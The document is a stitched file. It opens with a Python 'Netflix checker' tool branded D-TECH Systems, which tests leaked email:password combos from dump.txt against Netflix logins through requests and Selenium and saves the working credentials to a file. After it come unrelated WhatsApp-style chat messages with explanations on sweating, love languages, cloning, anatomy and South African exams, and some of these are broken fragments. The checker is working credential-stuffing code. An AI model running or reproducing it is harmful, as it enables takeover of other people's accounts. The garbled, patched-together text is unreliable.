# D-TECH animation effect
def d_tech_animation():
    print("\033[1;36m")
    print("Loading D-TECH Systems...")
    animation = "|/-\\"

    print("==========================================")
    print("          [+] D-TECH SYSTEMS [+]          ")
    print("            made by preasx24              ")
    print("==========================================\n")
    time.sleep(2)

# V1.1 Netflix Checker
def netflix_checker_v1_1():
    print("Launching Netflix Checker V1.1...")
    time.sleep(1)

    def display_banner():
        print('\033[1;36m')
        print('==========================================')
        print('           [+] D-TECH SYSTEMS [+]         ')
        print('          --- Netflix Checker v1.1 ---    ')
        print('            made by preasx24              ')
        print('==========================================')
        print('\033[0m')
        time.sleep(2)

    def read_file(file_name):
        try:
            with open(file_name, "r") as filestream:
                lines = filestream.readlines()
                print(f'\033[1;33m[!] Reading {len(lines)} lines from {file_name}\033[0m')
                return lines
        except Exception as e:
            print(f'\033[1;31m[!] Failed to read file: {e}\033[0m')
            return []

    def process_accounts(lines):
        contex = 0
        contno = 0
        accPass = []

        login_url = 'https://www.netflix.com/Login?locale=es-CL'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

        for i, line in enumerate(lines):
            print(f'\033[1;34m[!] Processing account {i+1}/{len(lines)}: {line.strip()}\033[0m')
            currentline = line.strip().split(':')
            if len(currentline) != 2:
                print('\033[1;31m[-] Skipping invalid line format.\033[0m')
                continue

            try:
                session = requests.Session()
                login_page = session.get(login_url, headers=headers)
                soup = BeautifulSoup(login_page.text, 'html.parser')

                login_data = {
                    'email': currentline[0],
                    'password': currentline[1]
                }

                response = session.post(login_url, data=login_data, headers=headers)
                if 'browse' in response.url:
                    print('\033[1;32m[+] Account Active: ' + currentline[0] + '\033[0m')
                    contex += 1
                    accPass.append(currentline[0] + ':' + currentline[1])
                    time.sleep(1)
                else:
                    print('\033[1;31m[-] Account Dead: ' + currentline[0] + '\033[0m')
                    contno += 1
                    time.sleep(1)

            except Exception as e:
                print(f'\033[1;31m[!] Error processing account {currentline[0]}: {e}\033[0m')
                continue

        return contex, contno, accPass

    def write_to_file(active_accounts):
        with open('good.txt', 'w') as outfile:
            print('\033[1;35m[!] Writing active accounts to good.txt...\033[0m')
            for account in active_accounts:
                print(f'\033[1;36m[+] {account}\033[0m')
                outfile.write(account + '\n')

    def main_v1_1():
        display_banner()
        lines = read_file("dump.txt")
        if not lines:
            print('\033[1;31m[!] No accounts to process.\033[0m')
            return
        contex, contno, active_accounts = process_accounts(lines)
        write_to_file(active_accounts)
        print(f'\n\033[1;32m[!] Active accounts: {contex}\033[0m')
        print(f'\033[1;31m[!] Dead accounts: {contno}\033[0m')
        print('\033[1;36m[+] Process complete by D-TECH SYSTEMS [+]\033[0m')

    main_v1_1()

# V2.2 Netflix Checker
def netflix_checker_v2_2():
    print("Launching Netflix Checker V2.2...")
    time.sleep(1)

    def title():
        print("\n\033[38;5;7m[+] D-TECH Netflix Checker V2.2 [+]\n")
        print("Current IP: {} - Netflix's location: {}\n".format(details[0], details[1]))

    def read_file(file_name):
        try:
            with open(file_name, "r") as filestream:
                lines = filestream.readlines()
                print(f'\033[1;33m[!] User:password combinations loaded successfully from {file_name}\033[0m')
                return [line.strip().split(':') for line in lines]
        except Exception as e:
            print(f'\033[1;31m[!] Failed to read file: {e}\033[0m')
            return []

    def check_account(user, password):
        try:
            browser_options = Options()
            browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
            browser = webdriver.Chrome(options=browser_options)
            browser.set_window_size(500, 700)
            browser.get(page)
            time.sleep(0.7)

            if browser.find_elements(By.XPATH, '//button[@id="onetrust-reject-all-handler"]'):
                button = browser.find_element(By.XPATH, '//button[@id="onetrust-reject-all-handler"]')
                button.click()
                time.sleep(0.7)
            if browser.find_elements(By.XPATH, '//button[@data-uia="login-toggle-button"]'):
                if browser.find_element(By.XPATH, '//button[@data-uia="login-toggle-button"]').text == "Use password":
                    button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
                    button.click()
            time.sleep(0.7)

            login = browser.find_element(By.XPATH, '//input[@name="userLoginId"]')
            password_elem = browser.find_element(By.XPATH, '//input[@name="password"]')
            login.send_keys(user)
            time.sleep(0.7)
            password_elem.send_keys(password)
            time.sleep(0.7)
            action = ActionChains(browser)
            password_elem.send_keys(Keys.TAB)
            password_elem.send_keys(Keys.ENTER)
            time.sleep(0.7)

            if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH, '//div[@id="loginErrorMessage"]'):
                return False
            if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH, '//div[@class="profiles-gate-container"]'):
                return True
        except Exception as e:
            print(f'\033[1;31m[!] Error checking account {user}: {e}\033[0m')
            return False
        finally:
            if 'browser' in locals():
                browser.quit()

    def main_v2_2():
        global details, page
        details = ["127.0.0.1", "Localhost", "US"]  # Replace with real IP retrieval if necessary
        page = "https://www.netflix.com/login"
        counter = 0
        hits = 0

        accounts = read_file("dump.txt")
        if not accounts:
            print('\033[1;31m[!] No accounts to process.\033[0m')
            return

        for user, password in accounts:
            print(f"\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{counter}:\033[0m {user}:{password}")
            counter += 1
            is_valid = check_account(user, password)
            if is_valid:
                hits += 1
                print(f"\033[1;32m[+] Valid account: {user}:{password}\033[0m")
                with open('valid_accounts.txt', 'a') as f:
                    f.write(f'{user}:{password}\n')
            else:
                print(f"\033[1;31m[-] Invalid account: {user}:{password}\033[0m")
            time.sleep(1)

        print(f'\n\033[1;32m[+] Total valid accounts: {hits}\033[0m')
        print('\033[1;36m[+] Process complete by D-TECH SYSTEMS [+]\033[0m')

    main_v2_2()

# Main controller
def main():
    d_tech_animation()
    while True:
        option = main_menu()
        if option == '1':
            netflix_checker_v1_1()
        elif option == '2':
            netflix_checker_v2_2()
        elif option.lower() == 'q':
            print("Exiting D-TECH Systems. Goodbye!")
            break
        else:
            print("\033[1;31mInvalid option. Please try again.\033[0m")

if __name__ == '__main__':
    main()

2024/09/20, 11:09 pm - lefa: Excessive sweating on chairs, also known as hyperhidrosis, can be caused by various factors. Here are some possible reasons:


*Physical Factors:*

1. Overactive sweat glands
2. Hormonal imbalance
3. Thyroid disorders
4. Low blood sugar
5. Menopause or pregnancy
6. Certain medical conditions (e.g., diabetes, anxiety disorders)


*Environmental Factors:*

1. High temperatures
2. Humidity
3. Tight or synthetic clothing
4. Poor ventilation
5. Stress or anxiety


*Lifestyle Factors:*

1. Poor diet (e.g., spicy foods, caffeine)
2. Lack of exercise
3. Obesity
4. Smoking
5. Alcohol consumption


*Medical Conditions:*

1. Hyperthyroidism
2. Hypothyroidism
3. Diabetes
4. Anxiety disorders (e.g., social anxiety)
5. Autonomic nervous system disorders


*Other Possible Causes:*

1. Medication side effects
2. Sleep disorders
3. Nutritional deficiencies (e.g., vitamin B12)
4. Infections (e.g., fungal, bacterial)


To address excessive sweating:


1. Consult a doctor to rule out underlying medical conditions.
2. Wear breathable clothing.
3. Use antiperspirants or sweat-absorbing products.
4. Stay hydrated.
5. Exercise regularly.
6. Manage stress through relaxation techniques.
7. Consider using sweat-wicking chair covers or cushions.

2024/10/08, 5:02 pm - ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎: Love languages refer to the ways people express and receive love, as introduced by Gary Chapman in his 1992 book "The 5 Love Languages: The Secret to Love That Lasts."


The 5 Love Languages:


1. Words of Affirmation (verbal compliments, words of appreciation)
2. Quality Time (undivided attention, shared activities)
3. Receiving Gifts (physical tokens of love and thoughtfulness)
4. Acts of Service (helping, supporting, and serving)
5. Physical Touch (holding hands, hugs, intimate contact)


People tend to have a primary and secondary love language, which may differ from their partner's.


Understanding love languages helps:


1. Improve communication.
2. Show love and affection effectively.
3. Strengthen relationships.


Examples:


- "I feel loved when you surprise me with flowers" (Receiving Gifts).
- "I love spending quality time with you" (Quality Time).
- "Your words of encouragement mean everything" (Words of Affirmation).
- "Helping with chores shows you care" (Acts of Service).
"I adore cuddling with you" (Physical Touch).

2024/11/23, 9:02 pm - ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎: Introverts are individuals who tend to be more reserved, reflective, and energized by solo activities or smaller, more intimate social interactions. Here are some key characteristics of introverts:

- _Prefer quieter environments_: Introverts often feel overwhelmed by loud noises, crowded spaces, or intense social situations.
- _Need time alone to recharge_: Introverts tend to feel drained by excessive socializing and need time to themselves to relax and rejuvenate.
- _Reflective and thoughtful_: Introverts often think deeply about their thoughts, feelings, and experiences before sharing them with others.
- _Prefer smaller social circles_: Introverts tend to prefer smaller, more meaningful social interactions rather than large, superficial ones.
- _May feel anxious in social situations_: Introverts might feel apprehensive or nervous in social situations, especially if they're unsure of what to expect.

It's essential to remember that being an introvert is not the same as being shy or socially anxious. Many introverts are highly confident and skilled communicators; they simply prefer to approach social interactions in a more low-key, thoughtful way.

2025/02/22, 7:24 pm - ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎: In South Africa, when you rewrite your NSC (National Senior Certificate) exams, the rules regarding the SBA (School-Based Assessment) marks can change.

If you rewrite your NSC exams in June, your SBA marks will no longer be included in your final result. Instead, your final mark will be based solely on your performance in the June rewrite exams.

So, to confirm:

- Original NSC exams: SBA marks contribute 25%, and exam marks contribute 75%.
- June rewrite exams: SBA marks are no longer included, and your final mark is based 100% on your performance in the June rewrite exams.

Keep in mind that these rules might be subject to change, so it's always best to confirm with your school or the Department of Basic Education for the most up-to-date information.

- "I talk complete rubbish" or

- Frosted glass
- Cloudy plastic

On the other hand, "transparent" refers to something that allows light to pass through clearly, without scattering, so objects on the other side are visible.

2025/06/29, 11:26 pm - ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎: There are *5 main love languages*, based on Dr. Gary Chapman's concept. Each represents a way people give and receive love:

1. *Words of Affirmation*
   – Verbal expressions of love, praise, appreciation (e.g., “I love you,” compliments).

2. *Acts of Service*
   – Doing helpful things for your partner (e.g., chores, errands, making a meal).

3. *Receiving Gifts*
   – Thoughtful presents that show you were thinking of them (not about expense, but meaning).

4. *Quality Time*
   – Giving undivided attention, meaningful conversation, shared activities.

5. *Physical Touch*
   – Hugs, holding hands, kisses, closeness; physical affection.

2025/08/13, 1:45 pm - ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎: Yes, *clones—especially animal clones—often have birth defects or serious health issues*, and that’s one of the major reasons why *human cloning is not allowed*.

Why clones have defects:
1. *Genetic instability* – Cloning uses a technique called *somatic cell nuclear transfer*, which doesn’t always perfectly reset the DNA. That can lead to *abnormal gene expression*.
2. *Incomplete development* – The cloned embryo might not develop properly in the womb, leading to *organ defects*, *premature aging*, or *immune problems*.
3. *High failure rate* – In animal experiments, *most cloned embryos don’t survive*. Even the ones that are born may die early or suffer from deformities.

Examples in animals:
- Dolly the sheep (the first cloned mammal) was considered a success, but she developed *arthritis* early and died at 6 from *lung disease*, which is unusual for a sheep that age.
- Many cloned animals have *large offspring syndrome*, where organs grow too big for the body to function normally.

Because of this, scientists agree cloning humans could cause *serious harm*, which is why it’s considered unethical and unsafe.

It’s sometimes called grinding or dry sex.

Unlike penetrative sex, there’s no direct insertion of a penis into a vagina or anus.

2025/09/18, 10:28 pm - ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎: The hymen is a thin, stretchy piece of tissue that partly covers the opening of the vagina.

Here’s a clear breakdown for you:

1. Anatomy:

It sits just inside the vaginal opening (a few millimeters in).

It’s not a “wall” or “seal” — it usually has one or more openings, so menstrual blood can pass through.

The size, shape, and thickness of a hymen are different for every person. Some have a crescent shape, some are more ring-like, and some have very little tissue at all.


2. Purpose:

The hymen doesn’t have a big biological purpose.

Doctors believe it may protect the vaginal area from infection in babies and young children, but beyond that, it doesn’t serve a necessary function.


3. Changes over time:

A hymen can stretch or tear from many things besides sex — like physical activity (cycling, gymnastics, riding a horse), tampon use, or even naturally as someone grows.

Some people are born with very little hymenal tissue, and some with none at all.


4. Hymen and virginity:

A common myth is that an “intact” hymen means someone is a virgin. That’s not true.

Because hymens vary so much, and because they can stretch without sex, you cannot tell if someone has had sex by examining their hymen.


5. Breaking / stretching:

When a hymen stretches significantly (for example during penetrative sex), some people might feel slight discomfort or notice a little bleeding — but many don’t.

For some, the tissue is so thin and elastic that it doesn’t tear noticeably at all.


👉 Think of it as a natural rim of tissue at the vaginal opening — not a “seal,” not proof of virginity, just part of normal anatomy.

2025/09/29, 6:40 pm - ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎: *Cum laude* is a Latin term that means *"with praise"* or *"with honor."* It’s an academic distinction awarded to students who graduate with high marks.

In South Africa and many other countries, it usually means:

- You've achieved a *final average of 75% or higher* for your degree.
- It’s a recognition of *academic excellence* — like graduating with top results in your class.

Some universities also use *magna cum laude* (higher honor) and *summa cum laude* (highest honor), but not all do.
